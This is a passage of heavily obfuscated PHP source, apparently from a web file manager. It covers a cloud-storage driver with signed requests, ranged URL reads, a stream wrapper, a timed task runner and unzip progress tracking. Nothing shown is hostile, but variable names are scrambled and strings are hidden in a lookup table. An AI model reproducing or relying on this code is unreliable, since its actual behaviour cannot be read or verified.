$û†äóÉ‡[1579] => $¼·¾ãà); if ($½±ñŠï) { $£¿½šË[$û†äóÉ‡[1450]] = $½±ñŠï; } $®¿ÎÚ©ú = base64_encode(json_encode($£¿½šË)); $œ¦íÑª = base64_encode(hash_hmac($û†äóÉ‡[1533], "\x50\x4f\123\x54\46{$áÆğìŸË}\x26{$¼·¾ãà}\46{$®¿ÎÚ©ú}", md5("{$this->userpass}"), !0)); $ò…ÖÕàÛ = array($û†äóÉ‡[293] => $®¿ÎÚ©ú, $û†äóÉ‡[1580] => "\125\x50\131\x55\116\x20{$this->username}\x3a{$œ¦íÑª}", $û†äóÉ‡[209] => $this->endpoint . $áÆğìŸË); return $ò…ÖÕàÛ; } public function download($¶º¥Ì¥¦, $ŞÉèÅÉÑ) { $–Âõ­Ì° = IO::getPathInner(IO::mkfile($ŞÉèÅÉÑ)); if (!($ƒà«Ÿ—Ë = $this->link($¶º¥Ì¥¦))) { return !1; } $ö¶Î£†¤ = 0; $ÙŒ·† = 1024 * 200; $ÁÕ·ù°± = fopen($–Âõ­Ì°, $_SERVER[Ñ¯©ç][1517]); while (!0) { $‚¥ÁÖıå = $this->fileSubstr($¶º¥Ì¥¦, $ö¶Î£†¤, $ÙŒ·†); if ($‚¥ÁÖıå === !1) { return !1; } fwrite($ÁÕ·ù°±, $‚¥ÁÖıå); $ö¶Î£†¤ += $ÙŒ·†; if (strlen($‚¥ÁÖıå) < $ÙŒ·†) { break; } } fclose($ÁÕ·ù°±); return $ŞÉèÅÉÑ; } public function link($‡çšãˆæ, $Ã²áëµï = array()) { $„Ñ¹çÑÃ =& $_SERVER[Ñ¯©ç]; $‡çšãˆæ = trim($‡çšãˆæ, $„Ñ¹çÑÃ[8]); if (!empty($this->token)) { $ì¯ıòÛ› = strtotime(date($„Ñ¹çÑÃ[1581])); $¶™¬ şä = substr(md5($this->token . $„Ñ¹çÑÃ[344] . $ì¯ıòÛ› . $„Ñ¹çÑÃ[1582] . $‡çšãˆæ), 12, 8) . $ì¯ıòÛ›; $Ã²áëµï[] = $„Ñ¹çÑÃ[1583] . $¶™¬ şä; } $àãÒ—Ûœ = !empty($Ã²áëµï) ? $„Ñ¹çÑÃ[86] . implode($„Ñ¹çÑÃ[344], $Ã²áëµï) : $„Ñ¹çÑÃ[12]; return $this->getHost() . $„Ñ¹çÑÃ[8] . $‡çšãˆæ . $àãÒ—Ûœ; } public function fileOut($Õ·—ùè, $„ßº²Æƒ = false, $÷×æ§Û† = false, $“Í†í = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Õ·—ùè, $„ßº²Æƒ, $÷×æ§Û†, $“Í†í); } if (!$÷×æ§Û†) { $÷×æ§Û† = $this->pathThis($Õ·—ùè); } $şˆÒá¬ = $„ßº²Æƒ ? array($_SERVER[Ñ¯©ç][1584] . rawurlencode($÷×æ§Û†)) : array(); $ÈÒ˜œˆ = $this->link($Õ·—ùè, $şˆÒá¬); $this->fileOutLink($ÈÒ˜œˆ); } public function fileOutServer($—ÅĞ¹æ , $ıÕ¦üĞ¯ = false, $¥ø®Á¤Û = false, $çÎ®ï½× = '') { parent::fileOut($—ÅĞ¹æ , $ıÕ¦üĞ¯, $¥ø®Á¤Û, $çÎ®ï½×); } public function fileOutImage($ûÁŒ©Å³, $ÄÖÃê†• = 250) { $ïŞá¼Äœ = $this->link($ûÁŒ©Å³ . $_SERVER[Ñ¯©ç][1585] . $ÄÖÃê†•); $this->fileOutLink($ïŞá¼Äœ); } public function fileOutImageServer($Œ‚é””™, $ºƒÀúà¡ = 250) { parent::fileOutImage($Œ‚é””™, $ºƒÀúà¡); } public function hashMd5($™–ø©Ç¤) { $ƒï‰¼¼ñ =& $_SERVER[Ñ¯©ç]; $²ÊğœÏ€ = $this->_objectMeta($™–ø©Ç¤); return isset($²ÊğœÏ€[$ƒï‰¼¼ñ[246]]) ? $²ÊğœÏ€[$ƒï‰¼¼ñ[246]] : !1; } public function size($˜±ôôÇ±) { $îŞ¤ØÊ¯ = $this->objectMeta($˜±ôôÇ±); return $îŞ¤ØÊ¯ ? $îŞ¤ØÊ¯[$_SERVER[Ñ¯©ç][89]] : 0; } public function info($›µ½ÆÙ•) { if ($this->isFolder($›µ½ÆÙ•)) { return $this->folderInfo($›µ½ÆÙ•); } else { if ($this->isFile($›µ½ÆÙ•)) { return $this->fileInfo($›µ½ÆÙ•); } } return !1; } public function exist($Şäó¦ÕÛ) { return $this->isFile($Şäó¦ÕÛ) || $this->isFolder($Şäó¦ÕÛ); } public function isFile($ˆÍ£«Á˜) { return !$this->isFolder($ˆÍ£«Á˜) && $this->objectMeta($ˆÍ£«Á˜); } public function isFolder($Öƒšº§Ü) { return $this->cacheMethod($_SERVER[Ñ¯©ç][179], $Öƒšº§Ü); } protected function objectMeta($“ÑŸË‡ë) { return $this->cacheMethod($_SERVER[Ñ¯©ç][181], $“ÑŸË‡ë); } protected function _objectMeta($ºß‡§àç) { $ÔÀÁ°È¬ =& $_SERVER[Ñ¯©ç]; if ($ºß‡§àç == $ÔÀÁ°È¬[12] || $ºß‡§àç == $ÔÀÁ°È¬[8]) { return array(); } $ú€ÍÍ¸× = $this->ussRequest($ºß‡§àç, $ÔÀÁ°È¬[1586]); if (!$ú€ÍÍ¸×[$ÔÀÁ°È¬[1269]]) { return null; } $êé‹ªˆ» = isset($ú€ÍÍ¸×[$ÔÀÁ°È¬[1259]]) ? $ú€ÍÍ¸×[$ÔÀÁ°È¬[1259]] : array(); if (!isset($êé‹ªˆ»[$ÔÀÁ°È¬[1587]])) { return null; } $©ÑËÏÏè = array($ÔÀÁ°È¬[33] => isset($êé‹ªˆ»[$ÔÀÁ°È¬[1587]]) ? $êé‹ªˆ»[$ÔÀÁ°È¬[1587]] : null, $ÔÀÁ°È¬[89] => isset($êé‹ªˆ»[$ÔÀÁ°È¬[1588]]) ? $êé‹ªˆ»[$ÔÀÁ°È¬[1588]] : null, $ÔÀÁ°È¬[246] => isset($êé‹ªˆ»[$ÔÀÁ°È¬[1589]]) ? $êé‹ªˆ»[$ÔÀÁ°È¬[1589]] : null, $ÔÀÁ°È¬[1556] => isset($êé‹ªˆ»[$ÔÀÁ°È¬[1590]]) ? $êé‹ªˆ»[$ÔÀÁ°È¬[1590]] : null); $©ÑËÏÏè[$ÔÀÁ°È¬[1557]] = isset($êé‹ªˆ»[$ÔÀÁ°È¬[1591]]) ? strtotime($êé‹ªˆ»[$ÔÀÁ°È¬[1591]]) : $©ÑËÏÏè[$ÔÀÁ°È¬[1556]]; return $©ÑËÏÏè; } protected function _isFolder($Š²…ÊÒ‡) { $¿÷´É• =& $_SERVER[Ñ¯©ç]; if ($Š²…ÊÒ‡ == $¿÷´É•[12] || $Š²…ÊÒ‡ == $¿÷´É•[8]) { return !0; } $ÉÁ¨Ş ® = $this->_objectMeta($Š²…ÊÒ‡); return isset($ÉÁ¨Ş ®[$¿÷´É•[33]]) && $ÉÁ¨Ş ®[$¿÷´É•[33]] == $¿÷´É•[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¢å‡³ú® = false) { } public function exist($í¡ÄÛû) { $ÌïØâôš = $this->info($í¡ÄÛû); return $ÌïØâôš[$_SERVER[Ñ¯©ç][233]]; } public function isFile($“ÅâğÚ) { $şŸ®Æ§ç = $this->info($“ÅâğÚ); return $şŸ®Æ§ç[$_SERVER[Ñ¯©ç][233]]; } public function isFolder($†şÂªÃ›) { return !1; } public function size($ñÁäõê¦) { $“ƒÃœæã = $this->info($ñÁäõê¦); return $“ƒÃœæã[$_SERVER[Ñ¯©ç][89]]; } public function info($î±°Íû×) { return $this->infoParse($î±°Íû×); } public function infoAuth($©Ş‰öì) { return $this->infoParse($©Ş‰öì); } public function infoWithChildren($êÁûÔğ) { return $this->infoParse($êÁûÔğ); } public function infoFull($®‡½à¢) { return $this->infoParse($®‡½à¢); } private function infoParse($¹ìªÍêÅ) { $á…ƒîî =& $_SERVER[Ñ¯©ç]; $ö»¿×Éª = $this->header($¹ìªÍêÅ); if (!$ö»¿×Éª || !$ö»¿×Éª[$á…ƒîî[803]]) { return !1; } $Òö†¤÷Ò = _get($ö»¿×Éª, $á…ƒîî[397], 0); $Ò‘ĞÆ¦ = array($á…ƒîî[32] => $ö»¿×Éª[$á…ƒîî[32]], $á…ƒîî[97] => $¹ìªÍêÅ, $á…ƒîî[33] => $á…ƒîî[231], $á…ƒîî[89] => intval($Òö†¤÷Ò), $á…ƒîî[188] => get_path_ext($ö»¿×Éª[$á…ƒîî[32]]), $á…ƒîî[1427] => $Òö†¤÷Ò > 0 && $ö»¿×Éª[$á…ƒîî[1592]], $á…ƒîî[1428] => !1); return $Ò‘ĞÆ¦; } private function header($„Ô–Óë) { $™‹Œà»Ú =& $_SERVER[Ñ¯©ç]; if (isset(self::$_cacheHeader[$„Ô–Óë])) { return self::$_cacheHeader[$„Ô–Óë]; } $„À…îÛ® = isset($GLOBALS[$™‹Œà»Ú[1593]]) ? $GLOBALS[$™‹Œà»Ú[1593]] : !1; $GLOBALS[$™‹Œà»Ú[1593]] = !0; self::$_cacheHeader[$„Ô–Óë] = url_header($„Ô–Óë); $GLOBALS[$™‹Œà»Ú[1593]] = $„À…îÛ®; return self::$_cacheHeader[$„Ô–Óë]; } public function hashSimple($äÛ ËŠ–, $ÄÔÃ­î = false) { $ŞĞù²š =& $_SERVER[Ñ¯©ç]; $ßŒàä²Ò = $this->info($äÛ ËŠ–); if (!$ßŒàä²Ò || !$ßŒàä²Ò[$ŞĞù²š[233]]) { return !1; } $‰ØÇ¾êæ = $ßŒàä²Ò[$ŞĞù²š[89]]; $úşó“è = 200; $îáŠ”€ = 50; if ($‰ØÇ¾êæ <= $úşó“è * $îáŠ”€) { return md5($this->fileSubstr($äÛ ËŠ–, 0, $‰ØÇ¾êæ)) . $‰ØÇ¾êæ; } $şíè¾…„ = intval($‰ØÇ¾êæ / $îáŠ”€); $Ñó£šˆš = $ŞĞù²š[12]; $õ©¸èïÕ = timeFloat(); $—è§¥© = 15; for ($¥Š¨¾’ = 0; $¥Š¨¾’ < $îáŠ”€; $¥Š¨¾’++) { if (timeFloat() - $õ©¸èïÕ > $—è§¥©) { return !1; } $¨¹ºèŠ = $this->fileSubstr($äÛ ËŠ–, $şíè¾…„ * $¥Š¨¾’, $úşó“è); if (!$¨¹ºèŠ) { return !1; } $Ñó£šˆš .= $¨¹ºèŠ; } $Ñó£šˆš .= $this->fileSubstr($äÛ ËŠ–, $‰ØÇ¾êæ - $úşó“è, $úşó“è); return md5($Ñó£šˆš) . $‰ØÇ¾êæ; } public function getContent($²˜ã„Üõ) { return $this->fileSubstr($²˜ã„Üõ); } public function fileSubstr($¨·Ïî±Ø, $“Ò‹ĞóÖ = 0, $óô­è¨Ã = -1) { $Ğ´ıôŒü =& $_SERVER[Ñ¯©ç]; $‹È«Ì€— = $this->info($¨·Ïî±Ø); if (!$‹È«Ì€— || !$‹È«Ì€—[$Ğ´ıôŒü[233]] && $‹È«Ì€—[$Ğ´ıôŒü[89]] > 1024 * 1024 * 10) { return !1; } if ($óô­è¨Ã === -1) { $óô­è¨Ã = $‹È«Ì€—[$Ğ´ıôŒü[89]]; } if ($óô­è¨Ã == 0) { return $Ğ´ıôŒü[12]; } $‹ªÄåıè = array($Ğ´ıôŒü[1594] . $“Ò‹ĞóÖ . $Ğ´ıôŒü[837] . ($“Ò‹ĞóÖ + $óô­è¨Ã - 1)); $½ãñ¼¬Š = url_request($¨·Ïî±Ø, $Ğ´ıôŒü[262], !1, $‹ªÄåıè, !1, !1, 30); return $½ãñ¼¬Š[$Ğ´ıôŒü[1259]] ? $½ãñ¼¬Š[$Ğ´ıôŒü[1259]] : $Ğ´ıôŒü[12]; } public function download($·×¼ÂŠº, $²Ü˜İÖë) { Downloader::start($·×¼ÂŠº, $²Ü˜İÖë); return $²Ü˜İÖë; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¶ÙÏÁ‚µ, $¨Åğß†ò = '') { $this->info = $this->info($¶ÙÏÁ‚µ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ñ¯©ç][97]]; $this->pathOpen = $¶ÙÏÁ‚µ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¶ÙÏÁ‚µ])) { self::$_chunkBuffer[$¶ÙÏÁ‚µ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¬ğš–Ëş) { $èìÙ° = $this->fileSubstr($this->pose, $¬ğš–Ëş); $this->pose += strlen($èìÙ°); return $èìÙ°; } public function stream_tell() { return $this->pose; } public function stream_seek($È€®¼Ş, $’œî¢ˆ©) { $ĞœóØ¤ƒ =& $_SERVER[Ñ¯©ç]; if ($’œî¢ˆ© == SEEK_SET) { $this->pose = $È€®¼Ş; } else { if ($’œî¢ˆ© == SEEK_CUR) { $this->pose += $È€®¼Ş; } else { if ($’œî¢ˆ© == SEEK_END) { $this->pose = $this->info[$ĞœóØ¤ƒ[89]] + intval($È€®¼Ş); } } } if ($È€®¼Ş < 0) { $this->pose = $this->info[$ĞœóØ¤ƒ[89]] + $È€®¼Ş; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ñ¯©ç][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ñÇÉõŸ¤, $ñĞ½»Ü•) { $ö´Ø‹ğş =& $_SERVER[Ñ¯©ç]; $¤¡Ø´× = $this->info($ñÇÉõŸ¤); return array($ö´Ø‹ğş[1595] => 0, $ö´Ø‹ğş[1596] => 0, $ö´Ø‹ğş[16] => 32768 + 511, $ö´Ø‹ğş[1597] => 0, $ö´Ø‹ğş[1598] => 0, $ö´Ø‹ğş[1599] => 0, $ö´Ø‹ğş[1600] => 0, $ö´Ø‹ğş[89] => $¤¡Ø´×[$ö´Ø‹ğş[89]], $ö´Ø‹ğş[1601] => $¤¡Ø´×[$ö´Ø‹ğş[1426]], $ö´Ø‹ğş[1557] => $¤¡Ø´×[$ö´Ø‹ğş[98]], $ö´Ø‹ğş[1556] => $¤¡Ø´×[$ö´Ø‹ğş[232]], $ö´Ø‹ğş[1602] => 0, $ö´Ø‹ğş[1603] => 0); } static $fileInfo = array(); public function info($×¾–ÓòÌ) { $ë¹Á›—Ï = $_SERVER[Ñ¯©ç][1604]; if (isset(self::$fileInfo[$×¾–ÓòÌ])) { return self::$fileInfo[$×¾–ÓòÌ]; } if (substr($×¾–ÓòÌ, 0, strlen($ë¹Á›—Ï)) != $ë¹Á›—Ï) { return !1; } self::$fileInfo[$×¾–ÓòÌ] = IO::info(substr($×¾–ÓòÌ, strlen($ë¹Á›—Ï))); return self::$fileInfo[$×¾–ÓòÌ]; } public static function read($¾±È¨„¦, $ŞëÇß’, $Ÿ¼©ô˜Ê) { if (!isset(self::$_fopenCache[$¾±È¨„¦])) { $À«£œª° = new StreamWrapperIO(); $À«£œª°->stream_open($¾±È¨„¦); self::$_fopenCache[$¾±È¨„¦] = $À«£œª°; } $À«£œª° = self::$_fopenCache[$¾±È¨„¦]; return $À«£œª°->fileSubstr($ŞëÇß’, $Ÿ¼©ô˜Ê); } public static function _read($¨€èâüš, $Ÿ´Âª, $¼ÃÏŠ‹¯) { $ığœ›ú¶ =& $_SERVER[Ñ¯©ç]; $À×ğÜÁĞ = fopen($¨€èâüš, $ığœ›ú¶[1430]); if (!$À×ğÜÁĞ) { return $ığœ›ú¶[12]; } $ù¾¡‚¾¯ = 8192; fseek($À×ğÜÁĞ, $Ÿ´Âª, SEEK_SET); $§ßÎø = $ığœ›ú¶[12]; $°şıÙç§ = 0; while ($°şıÙç§ < $¼ÃÏŠ‹¯) { $–Ô¥Ç‹± = min($ù¾¡‚¾¯, $¼ÃÏŠ‹¯ - $°şıÙç§); $§ßÎø .= fread($À×ğÜÁĞ, $–Ô¥Ç‹±); $°şıÙç§ += $–Ô¥Ç‹±; } fclose($À×ğÜÁĞ); return $§ßÎø; } public function fileSubstr($çæÁå, $İÜ›Š¸Ÿ) { $»ïÀçÇ„ =& $_SERVER[Ñ¯©ç]; $Ì„ïóë = $this->info[$»ïÀçÇ„[89]]; $¸‹Çöæí = $çæÁå; $ª—¬øÉÙ = $İÜ›Š¸Ÿ; if ($çæÁå < 0) { $çæÁå = $Ì„ïóë + $çæÁå; } if ($İÜ›Š¸Ÿ === !1) { $İÜ›Š¸Ÿ = $Ì„ïóë - $çæÁå; } if ($çæÁå + $İÜ›Š¸Ÿ > $Ì„ïóë) { $İÜ›Š¸Ÿ = $Ì„ïóë - $çæÁå; } if ($İÜ›Š¸Ÿ <= 0) { return $»ïÀçÇ„[12]; } if ($çæÁå < 0 || $çæÁå >= $Ì„ïóë || $İÜ›Š¸Ÿ <= 0 || $İÜ›Š¸Ÿ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\151\x6c\x65\x52\145\141\144\40\x65\162\x72\x6f\x72\41\40\x73\x74\x61\162\x74\x3d{$çæÁå}\x3b\x6c\x65\156\x67\x74\x68\x3d{$İÜ›Š¸Ÿ}\x3b\x20\163\x69\x7a\x65\x3d{$Ì„ïóë}\x3b"); } $Õ÷Ğæ­ = 64 * 1024; $ï´À°÷™ =& self::$_chunkBuffer[$this->path]; if (!$ï´À°÷™) { $ï´À°÷™ = array(); } $ğïêŒõ = 0; $ß¾œı¦‰ = 0; $¦† æï = $»ïÀçÇ„[12]; foreach ($ï´À°÷™ as $ğïêŒõ => $¦† æï) { $ğïêŒõ = intval($ğïêŒõ); $ß¾œı¦‰ = $ğïêŒõ + strlen($¦† æï); if ($çæÁå >= $ß¾œı¦‰) { continue; } if ($çæÁå >= $ğïêŒõ && $çæÁå + $İÜ›Š¸Ÿ <= $ß¾œı¦‰) { return substr($¦† æï, $çæÁå - $ğïêŒõ, $İÜ›Š¸Ÿ); } break; } if (count($ï´À°÷™) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($»ïÀçÇ„[1605], $»ïÀçÇ„[1606] . count($ï´À°÷™) . "\73\163\x74\141\162\x74\75{$çæÁå}\54\x6c\145\x6e\x67\164\150\75{$İÜ›Š¸Ÿ}\x3b\x70\157\163\x65\x3a{$ğïêŒõ}\176{$ß¾œı¦‰}"); throw new Exception($»ïÀçÇ„[1607]); } $ö¡äíûÕ = intval($çæÁå / $Õ÷Ğæ­) * $Õ÷Ğæ­; $ÔÎ¿Ä¯ = ceil(($çæÁå + $İÜ›Š¸Ÿ) / $Õ÷Ğæ­) * $Õ÷Ğæ­ - $ö¡äíûÕ; $ü¼ï¾­ = IO::fileSubstr($this->path, $ö¡äíûÕ, $ÔÎ¿Ä¯); $ï´À°÷™[$ö¡äíûÕ . $»ïÀçÇ„[12]] = $ü¼ï¾­; ksort($ï´À°÷™); $‚ÌŸêìæ = substr($ü¼ï¾­, $çæÁå - $ö¡äíûÕ, $İÜ›Š¸Ÿ); return $‚ÌŸêìæ; } private function log($¸õ·æÓ‡, $û‰³ÄÁÌ) { $ÇÇªÂ…Ö =& $_SERVER[Ñ¯©ç]; $œÔñ‰í³ = timeFloat() - $this->timeStart; write_log(sprintf($ÇÇªÂ…Ö[1608], $¸õ·æÓ‡, $this->info[$ÇÇªÂ…Ö[32]], $œÔñ‰í³, $û‰³ÄÁÌ), $ÇÇªÂ…Ö[1239]); } } goto EÑ¾ƒ¨º; E´‰ŠÉ´É: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($€°íÁ×, $é¬û¯°¬ = 5.0) { if (!$€°íÁ×) { return; } $ÛÔìşú = Cache::get($€°íÁ×); if (!$ÛÔìşú || timeFloat() - floatVal($ÛÔìşú) >= $é¬û¯°¬) { Cache::set($€°íÁ×, timeFloat(), $é¬û¯°¬ * 10); return !0; } return !1; } public static function timeLimitCall($ñïÄ‹Âü, $ØÖÖï²¦, $ªè±±¹, $ƒ¤±â¼Ø = 5.0) { $ƒáï†€£ =& $_SERVER[Ñ¯©ç]; if (!$ñïÄ‹Âü || !$ØÖÖï²¦) { return; } self::$asyncAdd = !0; $¸‡áÜÈô = $ƒáï†€£[1863]; $†Öˆ÷Ä© = Cache::get($¸‡áÜÈô, !0); $Ôµ¯¾Ü = array($ƒáï†€£[1864] => timeFloat(), $ƒáï†€£[1865] => timeFloat(), $ƒáï†€£[325] => $ØÖÖï²¦, $ƒáï†€£[1855] => $ªè±±¹, $ƒáï†€£[207] => $ƒ¤±â¼Ø); if (is_array($†Öˆ÷Ä©[$ñïÄ‹Âü])) { $Ôµ¯¾Ü[$ƒáï†€£[1865]] = $†Öˆ÷Ä©[$ñïÄ‹Âü][$ƒáï†€£[1865]]; } if (is_array($†Öˆ÷Ä©[$ñïÄ‹Âü])) { if (timeFloat() - $†Öˆ÷Ä©[$ñïÄ‹Âü][$ƒáï†€£[1864]] < $Ôµ¯¾Ü[$ƒáï†€£[207]] * 0.3) { return; } $Ôµ¯¾Ü[$ƒáï†€£[1865]] = $†Öˆ÷Ä©[$ñïÄ‹Âü][$ƒáï†€£[1865]]; } $†Öˆ÷Ä©[$ñïÄ‹Âü] = $Ôµ¯¾Ü; Cache::set($¸‡áÜÈô, $†Öˆ÷Ä©, 60); Cache::removeMemory($¸‡áÜÈô); write_log($ƒáï†€£[1866] . $ñïÄ‹Âü . $ƒáï†€£[84] . $ØÖÖï²¦, $ƒáï†€£[198]); } public static function timeLimitCallLoop() { $†½ÂÍËŸ =& $_SERVER[Ñ¯©ç]; $ÀûËÓóŠ = array($†½ÂÍËŸ[1867]); $Ö“ Î± = in_array(strtolower(ACTION), $ÀûËÓóŠ); if (!$Ö“ Î± && !self::$asyncAdd) { return; } $ù¹·ÓÇ­ = $†½ÂÍËŸ[1863]; $šê´ãı = Cache::get($ù¹·ÓÇ­, !0); if (!$šê´ãı || count($šê´ãı) <= 0) { return; } $¡ùó•†º = !1; $°ªÊÚÇ­ = timeFloat(); $¤¥âªé = array(); foreach ($šê´ãı as $ÅÚÌöô => $şïË†‘‚) { if ($°ªÊÚÇ­ - $şïË†‘‚[$†½ÂÍËŸ[1865]] > $şïË†‘‚[$†½ÂÍËŸ[207]]) { $¡ùó•†º = !0; try { Hook::apply($şïË†‘‚[$†½ÂÍËŸ[325]], $şïË†‘‚[$†½ÂÍËŸ[1855]]); write_log($†½ÂÍËŸ[1868] . $ÅÚÌöô . $†½ÂÍËŸ[84] . $şïË†‘‚[$†½ÂÍËŸ[325]] . $†½ÂÍËŸ[1869] . ACTION, $†½ÂÍËŸ[198]); } catch (Exception $å¦ğ½ßÑ) { } continue; } $¤¥âªé[$ÅÚÌöô] = $şïË†‘‚; } if (!$¡ùó•†º) { return; } if (!$¤¥âªé) { return Cache::remove($ù¹·ÓÇ­); } Cache::set($ù¹·ÓÇ­, $¤¥âªé, 60); Cache::removeMemory($ù¹·ÓÇ­); } public static function finished($¶Ú€ç, $éÕç‹·­) { $ş±çµî =& $_SERVER[Ñ¯©ç]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ş±çµî[325] => $¶Ú€ç, $ş±çµî[1855] => $éÕç‹·­); } private static function finishedRun() { $˜ïò‘” =& $_SERVER[Ñ¯©ç]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ä‹Ÿ¡Ğ) { try { Hook::apply($ä‹Ÿ¡Ğ[$˜ïò‘”[325]], $ä‹Ÿ¡Ğ[$˜ïò‘”[1855]]); } catch (Exception $¾®­Ø‘) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $­ÅñüÊÈ =& $_SERVER[Ñ¯©ç]; parent::startAfter(); Hook::bind($­ÅñüÊÈ[1870], array($this, $­ÅñüÊÈ[1871])); Hook::bind($­ÅñüÊÈ[1250], array($this, $­ÅñüÊÈ[1872])); Hook::bind($­ÅñüÊÈ[1873], array($this, $­ÅñüÊÈ[1874])); $ÑÚ€›‚‹ =& $this->task; $ÑÚ€›‚‹[$­ÅñüÊÈ[1875]] = $­ÅñüÊÈ[1251]; if (!$ÑÚ€›‚‹[$­ÅñüÊÈ[1647]]) { $ÑÚ€›‚‹[$­ÅñüÊÈ[1647]] = LNG($­ÅñüÊÈ[1876]); } } protected function endAfter() { $ˆ«üà•Ü =& $_SERVER[Ñ¯©ç]; parent::endAfter(); Hook::unbind($ˆ«üà•Ü[1870], array($this, $ˆ«üà•Ü[1871])); Hook::unbind($ˆ«üà•Ü[1250], array($this, $ˆ«üà•Ü[1872])); Hook::unbind($ˆ«üà•Ü[1873], array($this, $ˆ«üà•Ü[1874])); } public function updateAfter() { $ÃãªÅµ£ =& $_SERVER[Ñ¯©ç]; $‡Ê´Á±œ =& $this->task; if (!$‡Ê´Á±œ[$ÃãªÅµ£[1116]] || !$‡Ê´Á±œ[$ÃãªÅµ£[816]]) { if ($‡Ê´Á±œ[$ÃãªÅµ£[1875]] != $ÃãªÅµ£[373]) { return; } } if ($‡Ê´Á±œ[$ÃãªÅµ£[1875]] == $ÃãªÅµ£[1251]) { $çîê–Úä = 0; if ($‡Ê´Á±œ[$ÃãªÅµ£[1810]]) { $çîê–Úä = $‡Ê´Á±œ[$ÃãªÅµ£[1811]] / $‡Ê´Á±œ[$ÃãªÅµ£[1810]]; } $‡Ê´Á±œ[$ÃãªÅµ£[1759]] = $çîê–Úä * 0.3; } else { if ($‡Ê´Á±œ[$ÃãªÅµ£[1875]] == $ÃãªÅµ£[373]) { $çîê–Úä = $‡Ê´Á±œ[$ÃãªÅµ£[1758]] / $‡Ê´Á±œ[$ÃãªÅµ£[1116]]; $‡Ê´Á±œ[$ÃãªÅµ£[1759]] = 0.3 + $çîê–Úä * 0.4; } else { if ($‡Ê´Á±œ[$ÃãªÅµ£[1875]] == $ÃãªÅµ£[120]) { $ØÎß•“ = 0; if ($‡Ê´Á±œ[$ÃãªÅµ£[1812]] == $ÃãªÅµ£[120]) { $ØÎß•“ = $‡Ê´Á±œ[$ÃãªÅµ£[1811]]; } $çîê–Úä = ($‡Ê´Á±œ[$ÃãªÅµ£[1815]] + $ØÎß•“) / $‡Ê´Á±œ[$ÃãªÅµ£[816]]; $‡Ê´Á±œ[$ÃãªÅµ£[1759]] = 0.3 + 0.4 + $çîê–Úä * 0.3; } } } if ($‡Ê´Á±œ[$ÃãªÅµ£[1759]] > 0) { $Õºêà”ô = timeFloat() - $‡Ê´Á±œ[$ÃãªÅµ£[1761]] - $‡Ê´Á±œ[$ÃãªÅµ£[1764]]; $‡Ê´Á±œ[$ÃãªÅµ£[1765]] = $Õºêà”ô * (1 - $‡Ê´Á±œ[$ÃãªÅµ£[1759]]) / $‡Ê´Á±œ[$ÃãªÅµ£[1759]]; } } public function addFile($Ê¯¿ÙÒÚ) { $—»¿‘± =& $_SERVER[Ñ¯©ç]; $ïİÒĞ‰— =& $this->task; $úï ¶âù = IO::info($Ê¯¿ÙÒÚ); $ïİÒĞ‰—[$—»¿‘±[1808]] = $úï ¶âù[$—»¿‘±[32]]; $ïİÒĞ‰—[$—»¿‘±[1810]] = $úï ¶âù[$—»¿‘±[89]]; $ïİÒĞ‰—[$—»¿‘±[1811]] = 0; $ïİÒĞ‰—[$—»¿‘±[1118]] = $—»¿‘±[1831]; $ïİÒĞ‰—[$—»¿‘±[1812]] = $—»¿‘±[1251]; $ïİÒĞ‰—[$—»¿‘±[816]] = $úï ¶âù[$—»¿‘±[89]]; $ïİÒĞ‰—[$—»¿‘±[1116]] = 1; $Ú±€€˜à = 0; $ïİÒĞ‰—[$—»¿‘±[1819]] = array($—»¿‘±[1820] => $Ú±€€˜à + 1, $—»¿‘±[477] => $úï ¶âù[$—»¿‘±[32]], $—»¿‘±[97] => $úï ¶âù[$—»¿‘±[97]], $—»¿‘±[566] => $úï ¶âù[$—»¿‘±[566]] ? $úï ¶âù[$—»¿‘±[566]] : $úï ¶âù[$—»¿‘±[97]]); $this->update(); } public function zipEvent($Í†Èî‡ë, $¯ï’‡„°, $Úöäœ‚ğ, $ÔçÔ’Û) { $ä¤’™± =& $_SERVER[Ñ¯©ç]; $‘¿­ÒÌ— =& $this->task; $‘¿­ÒÌ—[$ä¤’™±[1808]] = get_path_this($¯ï’‡„°); $‘¿­ÒÌ—[$ä¤’™±[1810]] = $ÔçÔ’Û; $‘¿­ÒÌ—[$ä¤’™±[1811]] = $Úöäœ‚ğ; $‘¿­ÒÌ—[$ä¤’™±[1118]] = $Í†Èî‡ë == $ä¤’™±[1877] ? $ä¤’™±[1878] : $ä¤’™±[1879]; $‘¿­ÒÌ—[$ä¤’™±[1812]] = $ä¤’™±[12]; $‘¿­ÒÌ—[$ä¤’™±[816]] = $ÔçÔ’Û; $‘¿­ÒÌ—[$ä¤’™±[1875]] = $ä¤’™±[373]; $this->update(); } public function unzipAfter($„ØÊŞŸŸ) { $ŠÙŸ˜Á =& $_SERVER[Ñ¯©ç]; $éÃ†ÌßŠ =& $this->task; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1875]] = $ŠÙŸ˜Á[120]; $¿Šòİİå = IO::infoWithChildren($„ØÊŞŸŸ); $ß¯óäõ† = 0; $éÃ†ÌßŠ[$ŠÙŸ˜Á[1819]] = array($ŠÙŸ˜Á[1820] => $ß¯óäõ† + 1, $ŠÙŸ˜Á[477] => $¿Šòİİå[$ŠÙŸ˜Á[32]], $ŠÙŸ˜Á[97] => $¿Šòİİå[$ŠÙŸ˜Á[97]], $ŠÙŸ˜Á[566] => $¿Šòİİå[$ŠÙŸ˜Á[566]] ? 